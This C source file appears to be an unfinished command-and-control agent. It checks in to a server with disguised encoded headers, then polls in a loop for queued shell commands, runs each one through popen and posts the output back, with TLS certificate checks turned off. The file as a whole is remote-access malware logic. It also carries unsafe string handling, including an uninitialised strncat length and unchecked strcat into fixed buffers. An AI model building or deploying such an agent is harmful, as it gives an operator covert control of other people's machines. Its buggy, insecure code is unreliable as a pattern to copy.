#include <stdio.h>
#include <curl/curl.h>
#include <string.h>
#include <json-c/json.h>

//apt install libjson-c-dev
/*
struct headers{

};
*/




// global variables
char *first_response;
char *polling_response;
char *access_token;
char *refresh_token;
char *token_resp;

char *document_id;
char *document_ip;
char *document_os;
char *document_agent_id;
char *document_rev;

char *document_user;

char *pending_commands_array[10]; //multidimensional array used incase there are multiple commands pending
char **ptr_pending_comm_array = pending_commands_array;
char **command_output[100];
// json variables for tokens recieved from initial check in 
char *final_json;

struct json_object *parsed_json;
struct json_object *refresh_token_resp;
struct json_object *token;
struct json_object *refresh;
struct json_object *new_refresh;
struct json_object *id;
struct json_object *agent_id;
struct json_object *rev;
struct json_object *completed_commands;
struct json_object *ip;
struct json_object *os;
struct json_object *user;
struct json_object *pending_commands;
struct json_object *each_command_in_pending;
struct json_object *each_command_in_complete;
size_t n_pen_comm;
size_t n_com_comm;

///////
// json variables for params recieved on each poll to database 

/// function runs commands and return output in char array used in second callback function when doing get request and polling for commands
char *run_command_return_ouput(char *cmd){
	char *tmp;
	int counter = 0;
	tmp = malloc(1024 * sizeof(char));
	size_t n; // size for buffer
	char *dest = malloc(1025 * sizeof(char));
	char *fail_message = malloc(500 * sizeof(char));
	FILE *ff = popen(cmd,"r");
	if (ff == NULL){
		printf("fail\n");
		exit(1);
	}
	while(fgets(tmp,1025,ff )!= NULL){
		//printf("%d\n",counter+=1);
		strncat(dest,tmp,n);

	}
	int z = pclose(ff);
    if (z < 0)
    	perror("pclose(3) error");
    else if (z > 0){
    	sprintf(fail_message,"failed to run command %s",cmd);
    	return fail_message;
    }
    else
    	return dest;


    //if (pclose(ff) > 0)
    //	printf("failed\n");

    //printf("%s\n",dest);
    //return dest;

}



// first callback function on first_Check_in post request
char *first_check_in_callback(void *ptr, size_t size, size_t nmemb, void *stream){
    //printf("%s",ptr);
    //call back function
    //printf("test\n");
    first_response = malloc(nmemb * 2);
    strncpy(first_response,ptr,nmemb);
    //printf("%s\n",first_response);
    return first_response;
}

void poll_callback(void *ptr, size_t size, size_t nmemb, void *stream){
    polling_response = malloc(nmemb);
    strncpy(polling_response,ptr,nmemb);
    printf("%s\n",polling_response);
    if (polling_response){
    	parsed_json = NULL;
    	//rev = NULL;
    	parsed_json = json_tokener_parse(polling_response); 
    	// document id doesnt change so we dont need to get that value
    	//its a global variable
    	//json_object_object_get_ex(parsed_json,"rev",&rev);
    	json_object_object_get_ex(parsed_json,"agent_id",&agent_id);
    	json_object_object_get_ex(parsed_json,"completed_commands",&completed_commands);
    	json_object_object_get_ex(parsed_json,"ip",&ip);
    	json_object_object_get_ex(parsed_json,"os",&os);
    	json_object_object_get_ex(parsed_json,"pending_commands",&pending_commands);
    	json_object_object_get_ex(parsed_json,"user",&user);
    	json_object_object_get_ex(parsed_json,"_rev",&rev);
    	document_agent_id = json_object_get_string(agent_id);
    	document_rev = json_object_get_string(rev);
    	document_os = json_object_get_string(os);
    	document_ip = json_object_get_string(ip);
    	//document_user = json_object_get_string(user);
    	document_user = json_object_get_string(user);
    	n_pen_comm = json_object_array_length(pending_commands);
    	if (json_object_array_get_idx(pending_commands,0)){ // this works as the check to see if there is a pending commands or not
    		puts("Exists");
    		int i;
    		int x = 0;
    		printf("%lu\n",n_pen_comm);
    		for (i = 0; i < n_pen_comm; i++){
    			ptr_pending_comm_array[i] = json_object_get_string(json_object_array_get_idx(pending_commands,i));
    			puts("Successfully added following command to an array");
    			//printf("%s\n",ptr_pending_comm_array[i]);

    		}
    		// at this point you have pending commands in an array
    		// next step is to run the commands locally then get output save that to an array
    		// recreate the json string and post it back to the server
    		//
    		// setting up json array to hold output of completed commands
    		json_object *complete_comm_array = json_object_new_array();
    		json_object *pend_array = json_object_new_array();
    		while (ptr_pending_comm_array[x] != NULL){
    			// runs commands and puts the output in an array
    			puts(ptr_pending_comm_array[x]);
    			command_output[x] = run_command_return_ouput(ptr_pending_comm_array[x]);
    			puts(command_output[x]);
    		 	json_object *jstring1 = json_object_new_string(command_output[x]);
    		 	json_object_array_add(complete_comm_array,jstring1);
    			x++;

    		}
    		// now you have the command output in an array
    		// and the commands in another array
    		// now we gotta recreate the json string and post it back to the server
    		// then do a get request to get a new access token

    		// to recreate the json string we need to access the global variable that have the values and just create the json string with the json-c library
    		/*	char *document_id;
				char *document_ip;
				char *document_os;
				char *document_agent_id;
				char *document_rev;
				char *document_user;
				char *document_pending;
				char *document_complete;
			*/
			/*
    		printf("seeing if it gets this far %s\n",document_user);
    		printf("seeing if it gets this far %s\n",document_id);
    		printf("seeing if it gets this far %s\n",document_ip);
    		printf("seeing if it gets this far %s\n",document_os);
    		printf("seeing if it gets this far %s\n",document_agent_id);
    		printf("seeing if it gets this far %s\n",document_rev); // 
    		*/
    		//everything else is all good
    		json_object *post_object = json_object_new_object();
    		json_object *j_id = json_object_new_string(document_id);
    		json_object *j_ip = json_object_new_string(document_ip);
    		json_object *j_os = json_object_new_string(document_os);
    		json_object *j_agent = json_object_new_string(document_agent_id);
    		json_object *j_rev = json_object_new_string(document_rev);
    		json_object *j_user = json_object_new_string(document_user);
    		//missing pending command array and completed command array
    		//json_object *complete_comm_array = json_object_new_array();

    		json_object_object_add(post_object,"_id", j_id);
    		json_object_object_add(post_object,"ip", j_ip);
    		json_object_object_add(post_object,"os", j_os);
    		json_object_object_add(post_object,"agent_id", j_agent);
    		json_object_object_add(post_object,"_rev", j_rev);
    		json_object_object_add(post_object,"user", j_user);
    		json_object_object_add(post_object,"completed_commands", complete_comm_array);
    		json_object_object_add(post_object,"pending_commands",pend_array);
    		//printf ("The json object created: %s\n",json_object_to_json_string(post_object));
    		final_json = json_object_to_json_string(post_object);
    		printf("attemping to post json\n");
		    CURL *curl;
			CURLcode res;
			//POST REQUEST
			curl_global_init(CURL_GLOBAL_DEFAULT);
			curl = curl_easy_init();
			if (curl){
				struct curl_slist *chunk = NULL;
				curl_easy_setopt(curl, CURLOPT_POST, 12L);
				curl_easy_setopt(curl, CURLOPT_POSTFIELDS, final_json);
				/* Settings headers below */
				char header_doc[100] = "doc_id:";
				char header_auth[300] = "Authorization:Bearer ";
				strcat(header_doc,document_id);
				strcat(header_auth,access_token);
				//printf("%s\n",header_auth );
				//printf("%s\n",header_doc );
				chunk = curl_slist_append(chunk,header_auth);
				chunk = curl_slist_append(chunk,header_doc);
				chunk = curl_slist_append(chunk,"Content-Type:application/json");
				//chunk = curl_slist_append(chunk,"Agent:TGVhcm5pbmdDVG9CRWxpdGUK");
				/////////////////////////////
				curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
				curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
				curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
				curl_easy_setopt(curl,CURLOPT_URL,"https://127.0.0.1:9000/poll");
				//curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, poll_callback); // calls polling callback function
				res = curl_easy_perform(curl);
				if (res != CURLE_OK)
					fprintf(stderr,"curl_easy_perform() failed : %s\n",curl_easy_strerror(res));
				curl_easy_cleanup(curl);
			}
			curl_global_cleanup();




    	

    	}

    	else {
    		puts("no commands\n");
    		puts("GET REQUEST TO REFRESH TOKEN\n");
    		final_json = "failed";
    	}
    	//printf("%s\n",test );
    	//n_pen_comm = json_object_array_length(pending_commands);
    	// currently stuck at this point trying to validate if the array is empty or not

    	//n_pen_comm = json_object_array_length(pending_commands);
    	//n_com_comm = json_object_array_length(completed_commands);

    	//printf("amount of commands in pending => %lu \n",pending_commands);
    }
    // ok we got the response string,
    // parse into json
    // check if something is in pending commands
    // IF yes there is command, run the command and get output in string, post it to the database and get a refresh token for future requests
    // IF NOT just do a get request to get a new refresh token that needs to be parsed and saved for future requests
}




void first_check_in(char *urls){
	CURL *curl;
	CURLcode res;
	//POST REQUEST
	// need to create functions to run inital data commands and pass them to this data string below
	const char *data = "{\"agent_id\":\"123\",\"os\":\"Linux\",\"ip\":\"0.0.0.0\",\"user\":\"notroot\",\"completed_commands\":[],\"pending_commands\":[]}";
	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();
	if (curl){
		struct curl_slist *chunk = NULL;
		curl_easy_setopt(curl, CURLOPT_POST, 12L);
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
		/* Settings headers below */
		chunk = curl_slist_append(chunk,"User-Agent:QmxhY2tUYWJieQo=");
		chunk = curl_slist_append(chunk,"Content-Type:application/json");
		chunk = curl_slist_append(chunk,"Agent:TGVhcm5pbmdDVG9CRWxpdGUK");
		/////////////////////////////
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curl,CURLOPT_URL,urls);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, first_check_in_callback);
		//curl_easy_setopt(curl, CURLOPT_WRITEDATA, jsonz);
		res = curl_easy_perform(curl);
		if (res != CURLE_OK)
			fprintf(stderr,"curl_easy_perform() failed : %s\n",curl_easy_strerror(res));
		curl_easy_cleanup(curl);
	}
	curl_global_cleanup();
}



// this needs to be run on a loop
// performs get request to check if commands have been added to pending commands array in json document in database

int polling(char *id,char *token){
	CURL *curl;
	CURLcode res;
	//POST REQUEST
	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();
	if (curl){
		struct curl_slist *chunk = NULL;
		//curl_easy_setopt(curl, CURLOPT_POST, 12L);
		//curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
		/* Settings headers below */
		char header_doc[100] = "doc_id:";
		char header_auth[300] = "Authorization:Bearer ";
		strcat(header_doc,id);
		strcat(header_auth,token);
		//printf("%s\n",header_auth );
		//printf("%s\n",header_doc );
		chunk = curl_slist_append(chunk,header_auth);
		chunk = curl_slist_append(chunk,header_doc);
		//chunk = curl_slist_append(chunk,"Agent:TGVhcm5pbmdDVG9CRWxpdGUK");
		/////////////////////////////
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curl,CURLOPT_URL,"https://127.0.0.1:9000/poll");
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, poll_callback); // calls polling callback function
		res = curl_easy_perform(curl);
		if (res != CURLE_OK)
			fprintf(stderr,"curl_easy_perform() failed : %s\n",curl_easy_strerror(res));
		curl_easy_cleanup(curl);
	}
	curl_global_cleanup();
}


/*

	// below is for getting document id and header which doesnt seem neccesary yet
	char *header_buffer;
	size_t header_sz;
	header_sz = snprintf(NULL,0,"{\"doc_id\":\"%s\",\"Authorization\":\"Bearer %s\"}",id,token);
	header_buffer = (char *)malloc(header_sz + 1);
	if (header_buffer != NULL){
		puts("Successfully Allocated Buffer");
		snprintf(header_buffer, header_sz+1, "{\"doc_id\":\"%s\",\"Authorization\":\"Bearer %s\"}",id,token);
		//header_buffer now has the header string needed for get request
	}

	else
		exit(1);

	return 0; // return 0 for false and return 1 for true

	}

*/

//int final_post()

int get_refresh_token(char * refresh,char *url){
	CURL *curl;
	CURLcode res;
	//POST REQUEST
	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();
	if (curl){
		struct curl_slist *chunk = NULL;
		//curl_easy_setopt(curl, CURLOPT_POST, 12L);
		//curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
		/* Settings headers below */
		//char header_doc[100] = "doc_id:";
		char header_auth[300] = "Authorization:Bearer ";
		//strcat(header_doc,id);
		strcat(header_auth,refresh);
		printf("%s\n",header_auth );
		//printf("%s\n",header_doc );
		chunk = curl_slist_append(chunk,header_auth);
		//chunk = curl_slist_append(chunk,header_doc);
		//chunk = curl_slist_append(chunk,"Agent:TGVhcm5pbmdDVG9CRWxpdGUK");
		/////////////////////////////
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curl,CURLOPT_URL,url);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, first_check_in_callback); // calls polling callback function
		res = curl_easy_perform(curl);
		if (res != CURLE_OK)
			fprintf(stderr,"curl_easy_perform() failed : %s\n",curl_easy_strerror(res));
		curl_easy_cleanup(curl);
	}
	curl_global_cleanup();
}



int main(void){
	char *test_url = "https://localhost:9000/first_check_in";
	char *polling_url = "https://localhost:9000/poll";
	char *refresh_url = "https://localhost:9000/refresh";

	first_check_in(test_url);
	// setting up json
	//printf("%s\n",first_response);
	///// remember to free first response when done
	//free(first_response);
	parsed_json = json_tokener_parse(first_response); 
	free(first_response);

	// parsed json object
	json_object_object_get_ex(parsed_json,"id",&id);
	// getting each section of the json
	json_object_object_get_ex(parsed_json,"refresh",&refresh);
	json_object_object_get_ex(parsed_json,"rev",&rev);
	json_object_object_get_ex(parsed_json,"token",&token);
	//printf("%s\n",json_object_get_string(id));
	//printf("%s\n",json_object_get_string(refresh));
	//printf("%s\n",json_object_get_string(rev));
	//printf("%s\n",json_object_get_string(token));
	access_token = json_object_get_string(token);
	printf("%s\n",access_token );
	document_id = json_object_get_string(id);
	refresh_token = json_object_get_string(refresh);
	// saving document id as a string
	// saving access token as a string
	printf("Successfully Completed Check In\n");
	printf("Successfully Extracted first response into variables\n");
	while(1){
	sleep(10);
	polling(document_id,access_token);

	if (strcmp(final_json, "failed") == 0)
		printf("getting refresh token\n");
	else
		printf("it worked\n%s\n",final_json);

	
 }
 return 0;
}

/* PAYLOAD AND HEADERS */
//payload = {"agent_id":"{}".format(random_num),"os":"Windows","ip":"0.0.0.0","user":"guest","completed_commands":[],"pending_commands":[]}
/*


  'User-Agent': 'QmxhY2tUYWJieQo=',
	  'Content-Type': 'application/json',
	  'Agent': 'TGVhcm5pbmdDVG9CRWxpdGUK'


*/

/* 				after first check in 
				response will be something like this 


{
  "id": "40e136e13e72c126bda77cb133002186", 
  "refresh": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1NzczOTkzMTgsIm5iZiI6MTU3NzM5OTMxOCwianRpIjoiNDg5ZDgxZDUtNjNmYi00N2M3LTgxNDAtNGE5MzliN2U5NmI4IiwiZXhwIjoxNTc5OTkxMzE4LCJpZGVudGl0eSI6IjEyMyIsInR5cGUiOiJyZWZyZXNoIn0.xoxYCsYKetCiEaMZB9Vf8F0oClW6EDdCgjrYM_FfNDI", 
  "rev": "1-bdd018084a30fe28d15cdddfc4abc167", 
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1NzczOTkzMTgsIm5iZiI6MTU3NzM5OTMxOCwianRpIjoiMzlhZDk3OTAtMzQzYi00MTMxLTgzNWEtZDcwNTg4OTdlNjhjIiwiZXhwIjoxNTc3NDAwMjE4LCJpZGVudGl0eSI6IjEyMyIsImZyZXNoIjpmYWxzZSwidHlwZSI6ImFjY2VzcyJ9.3U1dZTbnHpxrjkPTU1E_l1Ex8bDhs4JPX0NplG9W6yE"
}

 */ 





